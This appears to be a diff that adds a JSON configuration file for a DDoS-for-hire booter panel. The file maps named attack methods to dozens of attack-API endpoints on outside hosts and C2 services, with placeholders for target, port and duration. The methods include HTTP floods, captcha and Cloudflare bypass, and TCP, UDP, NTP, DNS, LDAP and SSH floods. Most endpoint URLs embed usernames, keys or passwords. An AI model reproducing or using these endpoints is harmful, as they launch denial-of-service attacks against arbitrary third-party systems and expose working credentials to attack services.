@@ -1,0 +1,177 @@
+{
+    "Methods": [
+        {
+            "Name": "HTTP-FLOOD",
+            "Description": "Method is useful against regular webservers/low protected targets.",
+            "VIP": false,
+            "Level": "L7",
+            "URL": [
+                "http://45.128.232.77/api?id=1&key=wekvfaS2aiAQXVV8&target={target}&time={time}&method={method}&port={port}"
+            ]
+        },
+        {
+            "Name": "HTTP-STORM",
+            "Description": "It sends a very stable stream of HTTP/2 requests per second and it can also bypass some JS challenges.",
+            "VIP": true,
+            "Level": "L7",
+            "URL": [
+                "http://185.229.66.142/api?&target={target}&time={time}&method={method}&port={port}"
+            ]
+        },
+        {
+            "Name": "BROWSER",
+            "Description": "Emulates a real user, which allows you to bypass Captcha or JS challenges.",
+            "VIP": false,
+            "Level": "L7",
+            "URL": [
+        "http://resemble.wtf:443/resembleapi?key=apidzimiclouds1&target={HOST}&port={PORT}&time={TIME}&method=http-browser",
+        "http://satanservices.xyz:1337/api/attack?username=azer&key=cwel123&host={HOST}&port={PORT}&time={TIME}&method=BROWSER_API",
+        "https://api.leanc2.dev/api/attack?username=venigz&key=123123XD&host={HOST}&port={PORT}&time={TIME}&method=browser",
+        "http://109.71.252.180:128/api/attack?key=cwel&username=sizmi&host={HOST}&port={PORT}&time={TIME}&method=.http-browser",
+        "http://68.183.180.68/api/attack?username=dzimi&key=dzimi&host={HOST}&port={PORT}&time={TIME}&method=BROWSER",
+        "https://api.leanc2.dev/api/attack?username=venigz&key=123123XD&host={HOST}&port={PORT}&time={TIME}&method=BROWSER",
+        "https://denbots-api.online/api/attack?username=dzimi&secret=cwelek123&host={HOST}&port={PORT}&time={TIME}&method=CF-UAM",
+        "http://89.169.55.95/api/attack?username=cloudnetwork&secret=cloudnetwork&host={HOST}&port={PORT}&time={TIME}&method=TLS",
+        "http://swiftapi.ddns.net/api/attack?username=Azerbejdzanczyk&secret=Azerbejdzanczyk&host={HOST}&port={PORT}&time={TIME}&method=cf",
+        "https://apisystem.herios-stress.xyz/api/attack?username=azerbej&key=cwel123&host={HOST}&port={PORT}&time={TIME}&method=http-artermis",
+        "http://toxicipstresser.cloud:6969/api/attack?username=bozydarek&secret=cwelek1234&host={HOST}&port={PORT}&time={TIME}&method=BROWSER",
+        "http://5.42.100.115/api/attack?username=dzimi&key=Rapowista021&host={HOST}&port={PORT}&time={TIME}&method=BROWSER",
+        "http://51.68.214.19/api/attack?username=dizimi&key=changeme&host={HOST}&port={PORT}&time={TIME}&method=BYPASS",
+        "https://yuze-api.xyz/api/attack?username=dzimi&secret=dzimi123&host={HOST}&port={PORT}&time={TIME}&method=!browser",
+        "https://antiddos.alwaysdata.net/index.php?key=52863961016382&target{HOST}&port={PORT}&time={TIME}&method=browser",
+        "http://51.77.94.190:5000/api/attack?username=cloudnetwork&secret=api123api&host={HOST}&port={PORT}&time={TIME}&method=http2flood",
+        "https://crtz.top/api/attack?username=coconutapi&secret=coconut123api&host={HOST}&port={PORT}&time={TIME}&method=COOKIE",
+        "https://api.winterhosting.xyz/api/attack?username=dzimiskid123&key=changeme&host={HOST}&port={PORT}&time={TIME}&method=https-socket",
+        "https://quartz-api-system.lol/api?user=dzimi&pass=Rapowista021&host={HOST}&port={PORT}&time={TIME}&method=BROWSER",
+        "https://api.stresse.live/layer7?key=ASdghnKHSDdhDSH&target={HOST}&port={PORT}&time={TIME}&method=BROWSER",
+        "https://api.lkxstress.ru/attack?key=xglsqbvPmNmHBfwpiJpPMTYz&host={HOST}&time={TIME}&method=HTTP-ISA&proxies=all&ratelimit=32",
+        "https://api.lkxstress.ru/attack?key=xglsqbvPmNmHBfwpiJpPMTYz&host={HOST}&time={TIME}&method=HTTP-HERA&proxies=all&ratelimit=16",
+        "https://api.lkxstress.ru/attack?key=xglsqbvPmNmHBfwpiJpPMTYz&host={HOST}&time={TIME}&method=HTTP-HERA&proxies=all&ratelimit=128",
+        "https://api.xanaxc2.xyz/api/attack?username=nikos&key=nikos8721&host={HOST}&port={PORT}&time={TIME}&method=BROWSER",
+        "https://miami-api.cc/api/attack?username=coconut&secret=273-845-182&host={HOST}&port={PORT}&time={TIME}&method=!bypass",
+        "http://57.128.163.61/api/attack?username=dzimi&password=1337dzimicloudc2api1234@&host={HOST}&port={PORT}&time={TIME}&method=CFBYPASS",
+        "http://jumpyapi.fun/api/attack?username=dzimi&key=1234&host={HOST}&port={PORT}&time={TIME}&method=kill",
+        "http://188.212.102.234/api/attack?username=dzimi&key=cwel123&host={HOST}&port={PORT}&time={TIME}&method=!BROWSER",
+        "http://157.245.64.15:1337/api/attack?key=slq&host={HOST}&port={PORT}&time={TIME}&method=CFBYPASS",
+        "http://185.47.174.119:1337/api/attack?key=slq&host={HOST}&port={PORT}&time={TIME}&method=CFBYPASS",
+        "http://206.189.105.23:1337/api/attack?key=slq&host={HOST}&port={PORT}&time={TIME}&method=CFBYPASS",
+        "http://206.189.97.169:1337/api/attack?key=slq&host={HOST}&port={PORT}&time={TIME}&method=CFBYPASS",
+        "http://45.128.232.168:1337/api/attack?key=slq&host={HOST}&port={PORT}&time={TIME}&method=CFBYPASS",
+        "http://75.119.146.74:1337/api/attack?key=slq&host={HOST}&port={PORT}&time={TIME}&method=CFBYPASS",
+        "http://81.28.6.216:1337/api/attack?key=slq&host={HOST}&port={PORT}&time={TIME}&method=CFBYPASS",
+        "http://84.54.51.119:1337/api/attack?key=slq&host={HOST}&port={PORT}&time={TIME}&method=CFBYPASS",
+        "http://45.137.207.152:8000/api/attack?username=dzimi&key=apidzimiclouds1&host={HOST}&port={PORT}&time={TIME}&method=browser",
+        "https://api.externalc2.lol/api/attack?host={HOST}&port={PORT}&time={TIME}&method=CLOUDFLARE&key=dzimiasd239933&username=dzimi",
+        "http://45.128.232.219/api/attack?username=apidzimiclouds1&secret=apidzimiclouds1&host={HOST}&port={PORT}&time={TIME}&method=BYPASS",
+        "http://api.quantiumcode.pl/api/attack?host={HOST}&port={PORT}&time={TIME}&method=cloudflare&key=1234&username=dzimi",
+        "http://94.156.8.182:1234/api/attack?username=azerbej&key=pedalek123&host={HOST}&port={PORT}&time={TIME}&method=winter",
+        "http://94.156.71.55/api/attack?username=Bozy&key=bozyuser123&host={HOST}&port={PORT}&time={TIME}&method=browser",
+        "http://45.128.232.219/aggu/api?username=bozy&key=cwel1234&host={HOST}&port={PORT}&time={TIME}&method=bypass",
+        "http://satanservices.xyz:1337/api/attack?username=azer&key=pedalek123&host={HOST}&port={PORT}&time={TIME}&method=https-cloudflare",
+        "https://chidoriapi.xyz/api/attack?username=Azerbej&secret=pedal123&host={HOST}&port={PORT}&time={TIME}&method=browser",
+        "https://api.xanaxc2.xyz/api/attack?username=nikos&key=nikos8721&host={HOST}&port={PORT}&time={TIME}&method=browser",
+        "http://api.externalc2.xyz/api/attack?username=azer&key=8888&host={HOST}&port={PORT}&time={TIME}&method=browser",
+        "https://mull-api.online/api/attack?username=Azerbejdzanczyk&host={HOST}&port={PORT}&time={TIME}&key=1234&method=!http-browser",
+        "http://146.19.215.138/api/attack?username=azer&key=0000&host={HOST}&port={PORT}&time={TIME}&method=cloudflare",
+        "http://51.81.38.25:80/api/attack?username=Azerb&key=pedal123&host={HOST}&port={PORT}&time={TIME}&method=rapidreset",
+        "http://83.168.107.91/api/attack?username=xyz&key=comet-345243243-3424&host={HOST}&port={PORT}&time={TIME}&method=!http-bypass",
+        "http://83.168.69.66:444/obexapi?&target={HOST}&port={PORT}&time={TIME}&method=HTTPBYPASS&key=void",
+        "https://yuze-api.xyz/api/attack?username=enzo&password=enzo9&host={HOST}&port={PORT}&time={TIME}&method=!Browser",
+        "http://cloudc2.lol/api/attack?key=cwelek123&username=szeftegoburdelu&host={HOST}&port={PORT}&time={TIME}&method=cfbypass",
+        "https://apisystem.herios-stress.xyz/api/attack?username=exotic&key=exotic12&host={HOST}&port={PORT}&time={TIME}&method=HTTP-SOCKET",
+        "https://dnp3smsjs7mfqebdpntcmnkakqosdtot.api-endpoint.pro/api/attack?username=thab321&key=thabthab321123&host={HOST}&port={PORT}&time={TIME}&method=.browser",
+        "http://api.quantiumcode.pl/api/attack?host={HOST}&port={PORT}&time={TIME}&method=BROWSER&key=cloudflare&username=azer",
+        "https://theeyeapi.cc/api/attack?username=Azerbej&key=cwel123&host={HOST}&port={PORT}&time={TIME}&method=browser",
+        "http://apisystem.demondown.xyz/api/attack?username=Azerbejdzanczyk&password=fuckingscam&host={HOST}&port={PORT}&time={TIME}&method=http-nuke",
+        "https://api.999stresser.us/api/attack?host={HOST}&port={PORT}&time={TIME}&method=browser&key=1234&username=azerb",
+        "https://xstress.ru/api/attack?username=Ta1ny&secret=GKvnhhie93odllwjjbb&host={HOST}&port={PORT}&time={TIME}&method=HTTP-NUKE",
+        "https://whynodes.ru/v1/start?user=1&api_key=8KobMOVj38&target={HOST}&port={PORT}&time={TIME}&method=BROWSER",
+        "http://92.249.48.31:8000/api/attack?username=bozy&key=cwel1234&host={HOST}&port={PORT}&time={TIME}&method=BROWSER",
+        "http://109.71.252.180:128/api/attack?username=sizmi&key=cwel&host=%7BHOST%7D&port=%7BPORT%7D&time=%7BTIME%7D&method=.http-browser",
+        "http://205.185.118.169:777/api/attack?username=bozy&key=cwelek123&host={HOST}&port={PORT}&time={TIME}&method=!cloudflare",
+        "https://api.layer7booter.com/api/v1/layer7?key=vMuN4dIgrbWbESW7fwhRHEW2&target={HOST}&port={PORT}&duration={TIME}&method=BROWSER&request_type=post&post_data=%25rand%25&rate_limit=128&geolocation=world"
+            ]
+        },
+        {
+            "Name": "TCP",
+            "Description": "High PPS flood.",
+            "VIP": false,
+            "Level": "L4",
+            "URL": [
+                "http://185.229.66.142/api?id=1&key=wekvfaS2aiAQXVV8&target={target}&time={time}&method={method}&port={port}"
+            ]
+        },
+        {
+            "Name": "UDP",
+            "Description": "Sending a lot of UDP packets.",
+            "VIP": false,
+            "Level": "L4",
+            "URL": [
+                "http://45.128.232.77/api?id=1&key=wekvfaS2aiAQXVV8&target={target}&time={time}&method={method}&port={port}"
+            ]
+        },
+        {
+            "Name": "SOCKET",
+            "Description": "SOCKET flood.",
+            "VIP": false,
+            "Level": "L4",
+            "URL": [
+                "http://45.128.232.77/api?id=1&key=wekvfaS2aiAQXVV8&target={target}&time={time}&method={method}&port={port}"
+            ]
+        },
+        {
+            "Name": "OVH-TCP",
+            "Description": "TCP flood with OVH bypass.",
+            "VIP": false,
+            "Level": "L4",
+            "URL": [
+                "http://45.128.232.77/api?id=1&key=wekvfaS2aiAQXVV8&target={target}&time={time}&method={method}&port={port}"
+            ]
+        },
+        {
+            "Name": "NFO",
+            "Description": "TCP flood.",
+            "VIP": false,
+            "Level": "L4",
+            "URL": [
+                "http://45.128.232.77/api?id=1&key=wekvfaS2aiAQXVV8&target={target}&time={time}&method={method}&port={port}"
+            ]
+        },
+        {
+            "Name": "NTP",
+            "Description": "High Gbit/s NTP flood.",
+            "VIP": false,
+            "Level": "L4",
+            "URL": [
+                "http://45.128.232.77/api?id=1&key=wekvfaS2aiAQXVV8&target={target}&time={time}&method={method}&port={port}"
+            ]
+        },
+        {
+            "Name": "DNS",
+            "Description": "High Gbit/s DNS flood.",
+            "VIP": false,
+            "Level": "L4",
+            "URL": [
+                "http://45.128.232.77/api?id=1&key=wekvfaS2aiAQXVV8&target={target}&time={time}&method={method}&port={port}"
+            ]
+        },
+        {
+            "Name": "SSH",
+            "Description": "SSH socket flood.",
+            "VIP": false,
+            "Level": "L4",
+            "URL": [
+                "http://45.128.232.77/api?id=1&key=wekvfaS2aiAQXVV8&target={target}&time={time}&method={method}&port={port}"
+            ]
+        },
+        {
+            "Name": "LDAP",
+            "Description": "LDAP flood.",
+            "VIP": false,
+            "Level": "L4",
+            "URL": [
+                "http://45.128.232.77/api?id=1&key=wekvfaS2aiAQXVV8&target={target}&time={time}&method={method}&port={port}"
+            ]
+        }
+    ]
+              }
